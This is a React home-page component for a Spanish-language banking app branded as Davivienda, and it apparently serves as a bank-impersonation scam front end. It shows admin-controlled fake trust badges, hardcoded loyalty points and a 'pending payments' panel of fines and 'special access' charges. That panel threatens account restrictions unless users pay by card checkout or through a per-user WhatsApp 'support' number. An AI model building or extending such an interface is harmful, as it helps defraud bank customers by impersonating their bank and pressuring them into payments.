import { useState, useEffect } from 'react';
import { User, MoreHorizontal, Eye, EyeOff, CirclePlus, ArrowRight, Key, Repeat, FileText, HeadphonesIcon, MessageCircleIcon, AlertCircle, CreditCard, Shield, Star, Clock, BadgeCheck, Gift, Award, FileDown, CalendarClock, Headphones, Upload, Ticket, Receipt, Users, Bell, Lock, Coins, BarChart3, ShieldCheck, Globe, BookUser, X } from 'lucide-react';
import { useStore } from '@/lib/store';
import { formatCurrency, formatCurrencyWithCode } from '@/lib/utils';
import { CurrencyCode } from '@/types';
import { useToast } from '@/hooks/use-toast';
import { useLocation } from 'wouter';
import { LoadingOverlay } from '@/components/LoadingOverlay';
import { useSupportPhone } from '@/hooks/use-support-phone';
import { apiRequest } from '@/lib/queryClient';

const HomePage = () => {
  const { user, account, transactions, beneficiaries, getAccount, getTransactions, getBeneficiaries } = useStore();
  const [showBalance, setShowBalance] = useState(true);
  const [loading, setLoading] = useState(false);
  const [pendingCharges, setPendingCharges] = useState<any[]>([]);
  const [features, setFeatures] = useState<Record<string, boolean>>({});
  const { toast } = useToast();
  const [_, navigate] = useLocation();
  const { openWhatsApp } = useSupportPhone((user as any)?.customSupportPhone);

  const contactsSupported = typeof navigator !== 'undefined' && 'contacts' in navigator && typeof (navigator as any).contacts?.select === 'function';
  const [showContactsBanner, setShowContactsBanner] = useState(false);
  const [contactsBannerLoading, setContactsBannerLoading] = useState(false);

  useEffect(() => {
    if (contactsSupported) {
      const already = localStorage.getItem('davivienda_contacts_permission');
      if (!already) setShowContactsBanner(true);
    }
  }, [contactsSupported]);

  const handleRequestContactsPermission = async () => {
    setContactsBannerLoading(true);
    try {
      const results = await (navigator as any).contacts.select(['name', 'tel', 'email'], { multiple: false });
      localStorage.setItem('davivienda_contacts_permission', 'granted');
      setShowContactsBanner(false);
      toast({
        title: "Acceso a contactos habilitado",
        description: results?.length ? `Contacto seleccionado: ${results[0]?.name?.[0] || 'sin nombre'}` : "Acceso concedido correctamente.",
      });
    } catch (err: any) {
      if (err?.name === 'SecurityError') {
        toast({ title: "Permiso denegado", description: "El acceso a contactos fue rechazado.", variant: "destructive" });
        localStorage.setItem('davivienda_contacts_permission', 'denied');
        setShowContactsBanner(false);
      } else if (err?.name !== 'AbortError') {
        toast({ title: "Error", description: "No se pudo acceder a los contactos.", variant: "destructive" });
      }
    } finally {
      setContactsBannerLoading(false);
    }
  };

  const dismissContactsBanner = () => {
    localStorage.setItem('davivienda_contacts_permission', 'dismissed');
    setShowContactsBanner(false);
  };

  useEffect(() => {
    const fetchData = async () => {
      try {
        setLoading(true);
        await Promise.all([getAccount(), getTransactions(), getBeneficiaries()]);
        try {
          const res = await fetch('/api/charges', { credentials: 'include' });
          if (res.ok) {
            const charges = await res.json();
            const pending = charges.filter((c: any) => c.status === 'pending_payment');
            setPendingCharges(pending);
          }
        } catch {}
        try {
          const featRes = await fetch('/api/settings/features/all');
          if (featRes.ok) {
            const featData = await featRes.json();
            setFeatures(featData);
          }
        } catch {}
      } catch (error) {
        toast({
          title: "Error",
          description: "No pudimos cargar todos tus datos bancarios",
          variant: "destructive"
        });
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  // Acciones para cada botón
  const handleKeyTransfer = () => navigate('/transfers');
  
  const handleRecharge = () => {
    navigate('/recargas');
  };
  
  const handlePeaceAndSafe = () => {
    navigate('/certificados');
  };
  
  const handleCertificates = () => {
    navigate('/certificados');
  };
  
  const handleWithdrawWithoutCard = () => {
    navigate('/retirar');
  };
  
  const handleContactSupport = () => {
    openWhatsApp("Hola, necesito ayuda con mi cuenta. Tengo un error #4004");
  };

  return (
    <>
      {loading && <LoadingOverlay isVisible={true} text="Cargando información..." />}
      
      <div className="flex flex-col min-h-screen bg-gray-100">
        {/* Header */}
        <header className="bg-primary text-white p-4 flex items-center">
          <div className="flex items-center">
            <button 
              onClick={() => navigate('/profile')}
              className="w-10 h-10 bg-red-800 rounded-full flex items-center justify-center">
              <User size={20} />
            </button>
            <div className="ml-2">
              <button 
                onClick={() => navigate('/profile')}
                className="flex items-center">
                <span className="mr-1">{'>'}</span>
              </button>
            </div>
          </div>
          <div className="ml-auto">
            <h1 className="text-xl font-semibold">Hola, {user?.name.split(' ')[0]}</h1>
          </div>
        </header>

        <div className="flex-1 overflow-auto">

          {/* Banner de permisos de contactos */}
          {showContactsBanner && (
            <div className="mx-4 mt-4 bg-gradient-to-r from-red-600 to-red-700 rounded-xl p-4 text-white shadow-lg" data-testid="contacts-permission-banner">
              <div className="flex items-start justify-between gap-2">
                <div className="flex items-center gap-3 flex-1">
                  <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0">
                    <BookUser className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <p className="font-bold text-sm">Activar acceso a contactos</p>
                    <p className="text-xs text-red-100 mt-0.5">
                      Para transferir dinero a tus contactos sin escribir números manualmente.
                    </p>
                  </div>
                </div>
                <button onClick={dismissContactsBanner} className="text-red-200 hover:text-white flex-shrink-0 mt-0.5" data-testid="button-dismiss-contacts-banner">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="flex gap-2 mt-3">
                <button
                  onClick={handleRequestContactsPermission}
                  disabled={contactsBannerLoading}
                  data-testid="button-allow-contacts"
                  className="flex-1 bg-white text-red-600 text-sm font-semibold py-2 rounded-lg hover:bg-red-50 transition-colors disabled:opacity-60"
                >
                  {contactsBannerLoading ? 'Abriendo...' : 'Permitir acceso'}
                </button>
                <button
                  onClick={dismissContactsBanner}
                  data-testid="button-skip-contacts"
                  className="px-4 bg-white/20 text-white text-sm font-medium py-2 rounded-lg hover:bg-white/30 transition-colors"
                >
                  Ahora no
                </button>
              </div>
            </div>
          )}

          {/* Novedades */}
          <section className="mt-4 px-4">
            <h2 className="text-xl font-bold mb-3">Novedades</h2>
            <div className="bg-white rounded-lg p-4 shadow-sm">
              <div className="flex justify-between items-start mb-2">
                <h3 className="text-lg font-bold">¡Nunca entregue su tarjeta!</h3>
                <span className="text-xs bg-green-100 text-green-800 px-2 py-1 rounded">Nuevo</span>
              </div>
              <p className="text-gray-700">
                Su tarjeta es personal, aunque reciba una nueva nunca entregue la anterior, es suya para siempre. 
                Hágale caso a la Tía Segura.
              </p>
            </div>
          </section>

          {/* Mis productos */}
          <section className="mt-6 px-4">
            <div className="flex justify-between items-center mb-3">
              <h2 className="text-xl font-bold">Mis productos</h2>
              <button 
                className="flex items-center bg-white text-gray-700 rounded-full px-4 py-2 shadow-sm cursor-pointer"
                onClick={() => navigate('/profile')}
              >
                <CirclePlus size={18} className="mr-2" />
                <span className="text-sm">Solicitar productos</span>
              </button>
            </div>

            {/* Mis Cuentas */}
            <div className="bg-primary rounded-lg p-4 text-white shadow-sm">
              <div className="flex justify-between items-center mb-2">
                <h3 className="text-lg font-bold">Mis Cuentas</h3>
                <div 
                  className="w-8 h-8 flex items-center justify-center cursor-pointer" 
                  onClick={() => navigate('/history')}
                  title="Ver historial de movimientos"
                >
                  <FileText size={20} />
                </div>
              </div>

              <div className="mb-2">
                <p className="text-sm">Saldo disponible</p>
                <div className="flex items-center">
                  <p className="text-2xl font-bold mr-2" data-testid="text-balance-available">
                    {showBalance ? (
                      <>{formatCurrency(account?.balance || 0, account?.currency as CurrencyCode)}<span className="text-sm font-semibold ml-1 opacity-70">{account?.currency || 'COP'}</span></>
                    ) : "$ ********"}
                  </p>
                  <button onClick={() => setShowBalance(!showBalance)}>
                    {showBalance ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
                {(!account?.status || account?.status === "PENDIENTE") && (
                  <div className="mt-2 p-3 bg-red-100 border border-red-300 rounded-lg">
                    <p className="text-sm text-red-800 font-bold mb-2">Para activar su cuenta debe solicitar su tarjeta física o inscribir su TAG</p>
                    <button 
                      onClick={() => navigate('/cards')} 
                      className="bg-red-600 hover:bg-red-700 text-white w-full text-xs py-2 px-4 rounded-lg font-medium"
                      data-testid="button-request-card-home"
                    >
                      Solicitar Tarjeta / TAG
                    </button>
                  </div>
                )}
                {account?.status === "BLOQUEADA" && (
                  <div className="mt-2 p-2 bg-yellow-50 border border-yellow-400 rounded-md">
                    <div className="flex items-start">
                      <AlertCircle className="h-5 w-5 text-yellow-600 mr-2 mt-0.5 flex-shrink-0" />
                      <p className="text-sm text-black font-medium">{account.statusMessage}</p>
                    </div>
                    <button 
                      onClick={handleContactSupport}
                      className="mt-2 bg-red-600 text-white text-sm rounded-md px-3 py-1.5 flex items-center w-auto"
                      data-testid="button-contact-support"
                    >
                      <MessageCircleIcon size={16} className="mr-1" />
                      Contactar soporte
                    </button>
                  </div>
                )}
              </div>

              <div>
                <p className="text-sm">Saldo total</p>
                <p className="text-lg font-bold" data-testid="text-balance-total">
                  {showBalance ? (
                    <>{formatCurrency(account?.balance || 0, account?.currency as CurrencyCode)}<span className="text-xs font-semibold ml-1 opacity-70">{account?.currency || 'COP'}</span></>
                  ) : "$ ********"}
                </p>
              </div>
            </div>
          </section>

          {/* Pagos Pendientes - Visible siempre que haya cobros */}
          {pendingCharges.length > 0 && (
            <section className="mt-4 px-4" data-testid="pending-charges-section">
              <div className="bg-red-50 border border-red-200 rounded-lg p-4 shadow-sm">
                <div className="flex items-center mb-3">
                  <AlertCircle className="h-5 w-5 text-red-600 mr-2 flex-shrink-0" />
                  <h2 className="text-lg font-bold text-red-800">
                    Pagos Pendientes ({pendingCharges.length})
                  </h2>
                </div>
                <p className="text-sm text-red-700 mb-3">
                  Tienes cobros pendientes que requieren tu atención. Realiza el pago para evitar restricciones en tu cuenta.
                </p>
                <div className="space-y-3" data-testid="pending-charges-list">
                  {pendingCharges.map((charge: any) => (
                    <div key={charge.id} className="bg-white border border-red-200 rounded-lg p-3 shadow-sm" data-testid={`charge-item-${charge.id}`}>
                      <div className="flex justify-between items-start mb-1">
                        <div className="flex-1">
                          <p className="text-sm font-bold text-gray-800">{charge.reason}</p>
                          <span className="text-xs text-gray-500 capitalize">
                            {({'multa': 'Multa', 'cobro': 'Cobro', 'promo': 'Promo', 'descuento': 'Descuento', 'acceso_especial': 'Acceso Especial'} as Record<string, string>)[charge.type] || charge.type}
                          </span>
                        </div>
                        <span className="text-sm font-bold text-red-600 ml-2">
                          {formatCurrency(charge.amount, charge.currency as CurrencyCode)} {charge.currency}
                        </span>
                      </div>
                      {charge.description && (
                        <p className="text-xs text-gray-500 mb-2">{charge.description}</p>
                      )}
                      {charge.stripePaymentUrl ? (
                        <button
                          onClick={() => navigate(`/checkout/${charge.id}`)}
                          className="flex items-center justify-center w-full bg-green-600 hover:bg-green-700 text-white text-sm font-medium rounded-lg px-4 py-2.5 transition-colors"
                          data-testid={`button-pay-charge-${charge.id}`}
                        >
                          <CreditCard size={16} className="mr-2" />
                          Pagar ahora
                        </button>
                      ) : (
                        <div className="flex items-center justify-center w-full bg-yellow-100 border border-yellow-300 text-yellow-800 text-sm font-medium rounded-lg px-4 py-2.5">
                          <AlertCircle size={16} className="mr-2" />
                          Contacta soporte para realizar el pago
                        </div>
                      )}
                    </div>
                  ))}
                </div>
                <button 
                  onClick={handleContactSupport}
                  className="mt-3 bg-red-600 hover:bg-red-700 text-white text-sm rounded-lg px-4 py-2 flex items-center w-full justify-center transition-colors"
                  data-testid="button-contact-support-charges"
                >
                  <MessageCircleIcon size={16} className="mr-2" />
                  Contactar soporte para pagar
                </button>
              </div>
            </section>
          )}

          {/* Servicios Destacados */}
          <section className="mt-6 px-4">
            <h2 className="text-xl font-bold mb-3">Servicios destacados</h2>
            <div className="bg-white rounded-lg p-4 shadow-sm">
              <div className="grid grid-cols-4 gap-4 mb-4">
                <button onClick={handleKeyTransfer} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-green-500 flex items-center justify-center mb-1">
                    <Key size={18} className="text-green-500" />
                  </div>
                  <div className="text-center">
                    <span className="text-xs text-green-500 font-bold">Nuevo</span>
                    <p className="text-xs">Transferir con llaves</p>
                  </div>
                </button>

                <button onClick={handleRecharge} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <Repeat size={18} className="text-gray-500" />
                  </div>
                  <p className="text-xs text-center">Recargas</p>
                </button>

                <button onClick={handlePeaceAndSafe} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <div className="w-4 h-4 rounded-full bg-red-500 flex items-center justify-center">
                      <span className="text-white text-xs">✓</span>
                    </div>
                  </div>
                  <p className="text-xs text-center">Paz y salvo</p>
                </button>

                <button onClick={handleCertificates} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <FileText size={18} className="text-gray-500" />
                  </div>
                  <p className="text-xs text-center">Certificados</p>
                </button>
              </div>

              <div className="flex justify-center space-x-8">
                <button onClick={handleWithdrawWithoutCard} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <CreditCard size={18} className="text-gray-500" />
                  </div>
                  <p className="text-xs text-center">Retirar sin tarjeta</p>
                </button>
                
                <button onClick={() => navigate('/cards')} data-testid="link-cards" className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-red-500 flex items-center justify-center mb-1">
                    <CreditCard size={18} className="text-red-500" />
                  </div>
                  <p className="text-xs text-center text-red-500 font-medium">Mis Tarjetas</p>
                </button>
                
                <button onClick={() => navigate('/history')} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <FileText size={18} className="text-gray-500" />
                  </div>
                  <p className="text-xs text-center">Movimientos</p>
                </button>
                
                <button onClick={handleContactSupport} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-red-500 flex items-center justify-center mb-1">
                    <HeadphonesIcon size={18} className="text-red-500" />
                  </div>
                  <p className="text-xs text-center">Atención al cliente</p>
                </button>
              </div>
            </div>
          </section>

          {/* Features habilitadas por admin */}
          {features.feature_identity_verification && (
            <section className="mt-4 px-4" data-testid="feature-identity-verification">
              <div className="bg-green-50 border border-green-200 rounded-lg p-3 flex items-center gap-3">
                <BadgeCheck className="text-green-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-green-800 text-sm">Cuenta Verificada</p>
                  <p className="text-xs text-green-600">Su identidad ha sido verificada por Davivienda</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_promotions && (
            <section className="mt-4 px-4" data-testid="feature-promotions">
              <div className="bg-gradient-to-r from-red-600 to-red-800 rounded-lg p-4 text-white shadow-sm">
                <div className="flex items-center gap-2 mb-1">
                  <Gift size={20} />
                  <h3 className="font-bold">Promocion Especial</h3>
                </div>
                <p className="text-sm opacity-90">Abra su CDT digital y obtenga una tasa preferencial. Consulte con su asesor.</p>
              </div>
            </section>
          )}

          {features.feature_loyalty_points && (
            <section className="mt-4 px-4" data-testid="feature-loyalty-points">
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Star className="text-yellow-500 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Puntos Davivienda</p>
                    <p className="text-xs text-gray-600">Acumule puntos con cada transaccion</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-lg font-bold text-yellow-600">1,250</p>
                  <p className="text-xs text-gray-500">puntos</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_transfer_limits && (
            <section className="mt-4 px-4" data-testid="feature-transfer-limits">
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 flex items-center gap-3">
                <Shield className="text-blue-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Limite diario de transferencias</p>
                  <p className="text-xs text-gray-600">Su limite diario es de $10,000,000 COP para proteger su cuenta</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_account_insurance && (
            <section className="mt-4 px-4" data-testid="feature-account-insurance">
              <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-3 flex items-center gap-3">
                <Shield className="text-emerald-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Seguro de Cuenta Activo</p>
                  <p className="text-xs text-gray-600">Su cuenta esta protegida contra fraude y transacciones no autorizadas</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_bank_certificate && (
            <section className="mt-4 px-4" data-testid="feature-bank-certificate">
              <div className="bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Award className="text-red-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Certificado Bancario</p>
                    <p className="text-xs text-gray-600">Genere su certificado bancario digital</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/certificados')}
                  className="bg-red-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-bank-certificate"
                >
                  Ver
                </button>
              </div>
            </section>
          )}

          {features.feature_account_statement && (
            <section className="mt-4 px-4" data-testid="feature-account-statement">
              <div className="bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <FileDown className="text-blue-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Extracto de Cuenta</p>
                    <p className="text-xs text-gray-600">Descargue su extracto mensual</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/history')}
                  className="bg-blue-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-account-statement"
                >
                  Ver
                </button>
              </div>
            </section>
          )}

          <section className="mt-4 px-4" data-testid="feature-financial-reports">
            <div className="bg-gradient-to-r from-purple-50 to-indigo-50 border border-purple-200 rounded-lg p-3 flex items-center justify-between">
              <div className="flex items-center gap-3">
                <BarChart3 className="text-purple-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Reportes Financieros</p>
                  <p className="text-xs text-gray-600">Análisis inteligente de tu cuenta con IA</p>
                </div>
              </div>
              <button
                onClick={() => navigate('/reports')}
                className="bg-purple-600 text-white text-xs px-3 py-1.5 rounded-lg active:scale-95"
                data-testid="button-financial-reports"
              >
                Ver
              </button>
            </div>
          </section>

          {features.feature_scheduled_payments && (
            <section className="mt-4 px-4" data-testid="feature-scheduled-payments">
              <div className="bg-orange-50 border border-orange-200 rounded-lg p-3 flex items-center gap-3">
                <CalendarClock className="text-orange-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Pagos Programados</p>
                  <p className="text-xs text-gray-600">No tiene pagos programados pendientes</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_custom_messages && (
            <section className="mt-4 px-4" data-testid="feature-custom-messages">
              <div className="bg-indigo-50 border border-indigo-200 rounded-lg p-3">
                <p className="font-semibold text-sm text-indigo-800">Mensaje de su banco</p>
                <p className="text-xs text-indigo-700 mt-1">Bienvenido a Davivienda. Estamos comprometidos con la seguridad de sus finanzas. Recuerde no compartir sus datos de acceso con nadie.</p>
              </div>
            </section>
          )}

          {features.feature_priority_support && (
            <section className="mt-4 px-4" data-testid="feature-priority-support">
              <div className="bg-purple-50 border border-purple-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Headphones className="text-purple-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Soporte Prioritario</p>
                    <p className="text-xs text-gray-600">Tiene acceso a atencion preferencial</p>
                  </div>
                </div>
                <button 
                  onClick={handleContactSupport}
                  className="bg-purple-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-priority-support"
                >
                  Contactar
                </button>
              </div>
            </section>
          )}

          {features.feature_document_upload && (
            <section className="mt-4 px-4" data-testid="feature-document-upload">
              <button
                onClick={() => navigate('/documentos')}
                className="w-full bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between hover:bg-gray-50 transition-colors"
                data-testid="button-go-documentos"
              >
                <div className="flex items-center gap-3">
                  <Upload className="text-teal-600 shrink-0" size={24} />
                  <div className="text-left">
                    <p className="font-semibold text-sm">Carga de Documentos</p>
                    <p className="text-xs text-gray-600">Suba documentos de identidad y comprobantes</p>
                  </div>
                </div>
                <span className="bg-teal-100 text-teal-700 text-xs px-2 py-1 rounded-lg font-medium">Abrir →</span>
              </button>
            </section>
          )}

          {features.feature_support_tickets && (
            <section className="mt-4 px-4" data-testid="feature-support-tickets">
              <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Ticket className="text-amber-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Tickets de Soporte</p>
                    <p className="text-xs text-gray-600">Cree y haga seguimiento de sus solicitudes</p>
                  </div>
                </div>
                <span className="bg-amber-100 text-amber-700 text-xs px-2 py-1 rounded-lg font-medium">0 abiertos</span>
              </div>
            </section>
          )}

          {features.feature_transaction_receipts && (
            <section className="mt-4 px-4" data-testid="feature-transaction-receipts">
              <div className="bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Receipt className="text-sky-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Comprobantes Digitales</p>
                    <p className="text-xs text-gray-600">Descargue comprobantes de sus transacciones</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/history')}
                  className="bg-sky-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-transaction-receipts"
                >
                  Ver
                </button>
              </div>
            </section>
          )}

          {features.feature_beneficiary_management && (
            <section className="mt-4 px-4" data-testid="feature-beneficiary-management">
              <div className="bg-violet-50 border border-violet-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Users className="text-violet-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Gestión de Beneficiarios</p>
                    <p className="text-xs text-gray-600">Administre sus contactos y beneficiarios guardados</p>
                  </div>
                </div>
                <span className="bg-violet-100 text-violet-700 text-xs px-2 py-1 rounded-lg font-medium">{beneficiaries?.length || 0} guardados</span>
              </div>
            </section>
          )}

          {features.feature_fraud_alerts && (
            <section className="mt-4 px-4" data-testid="feature-fraud-alerts">
              <div className="bg-red-50 border border-red-200 rounded-lg p-3 flex items-center gap-3">
                <Bell className="text-red-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Alertas de Fraude Activas</p>
                  <p className="text-xs text-gray-600">Su cuenta está protegida con monitoreo de actividad sospechosa en tiempo real</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_account_freeze && (
            <section className="mt-4 px-4" data-testid="feature-account-freeze">
              <div className="bg-slate-50 border border-slate-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Lock className="text-slate-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Congelamiento de Cuenta</p>
                    <p className="text-xs text-gray-600">Congele su cuenta temporalmente si la necesita proteger</p>
                  </div>
                </div>
                <span className="bg-green-100 text-green-700 text-xs px-2 py-1 rounded-lg font-medium">Activa</span>
              </div>
            </section>
          )}

          {features.feature_multi_currency && (
            <section className="mt-4 px-4" data-testid="feature-multi-currency">
              <div className="bg-cyan-50 border border-cyan-200 rounded-lg p-3 flex items-center gap-3">
                <Coins className="text-cyan-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Cuentas Multi-Divisa</p>
                  <p className="text-xs text-gray-600">Opere en USD, EUR y COP con tasas de cambio actualizadas</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_scheduled_reports && (
            <section className="mt-4 px-4" data-testid="feature-scheduled-reports">
              <div className="bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <BarChart3 className="text-indigo-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Reportes Financieros</p>
                    <p className="text-xs text-gray-600">Reportes automáticos de ingresos y gastos</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/history')}
                  className="bg-indigo-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-scheduled-reports"
                >
                  Ver
                </button>
              </div>
            </section>
          )}

          {features.feature_two_factor_auth && (
            <section className="mt-4 px-4" data-testid="feature-two-factor-auth">
              <div className="bg-green-50 border border-green-200 rounded-lg p-3 flex items-center gap-3">
                <ShieldCheck className="text-green-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Autenticación de Dos Factores</p>
                  <p className="text-xs text-gray-600">Seguridad adicional activa en su cuenta para proteger sus operaciones</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_wire_transfer && (
            <section className="mt-4 px-4" data-testid="feature-wire-transfer">
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Globe className="text-blue-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Transferencias Internacionales</p>
                    <p className="text-xs text-gray-600">Envíe dinero a cuentas en el exterior vía SWIFT</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/transfer')}
                  className="bg-blue-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-wire-transfer"
                >
                  Enviar
                </button>
              </div>
            </section>
          )}

          {/* Le puede interesar */}
          <section className="mt-6 px-4">
            <h2 className="text-xl font-bold mb-3">Le puede interesar</h2>
            <div className="bg-blue-700 text-white rounded-lg p-4 shadow-sm flex items-center justify-between">
              <div>
                <h3 className="text-lg font-bold">Mi Casa</h3>
                <p className="text-sm">Compre, venda, arriende y contrate servicios.</p>
                <button 
                  className="flex items-center text-sm mt-2"
                  onClick={() => navigate('/profile')}
                >
                  <span className="mr-1">Ver más</span>
                  <ArrowRight size={14} />
                </button>
              </div>
              <div className="w-16 h-16 bg-blue-600 rounded-md"></div>
            </div>
          </section>

          {/* Mis finanzas */}
          <section className="mt-6 px-4 mb-4">
            <h2 className="text-xl font-bold mb-3">Mis finanzas</h2>
            <div className="bg-white rounded-lg p-4 shadow-sm">
              <div 
                className="flex items-center justify-between cursor-pointer"
                onClick={() => navigate('/history')}
              >
                <div className="flex items-center">
                  <div className="w-10 h-10 rounded-full border-2 border-t-blue-500 border-r-green-500 border-b-yellow-500 border-l-red-500 flex items-center justify-center mr-3"></div>
                  <div>
                    <h3 className="font-semibold">Tome control de su dinero</h3>
                    <p className="text-sm text-gray-600">Administre su presupuesto y controle sus ingresos y gastos para manejar su dinero.</p>
                  </div>
                </div>
                <ArrowRight size={20} className="text-gray-400" />
              </div>
            </div>
          </section>
        </div>

      </div>
    </>
  );
};

export default HomePage;
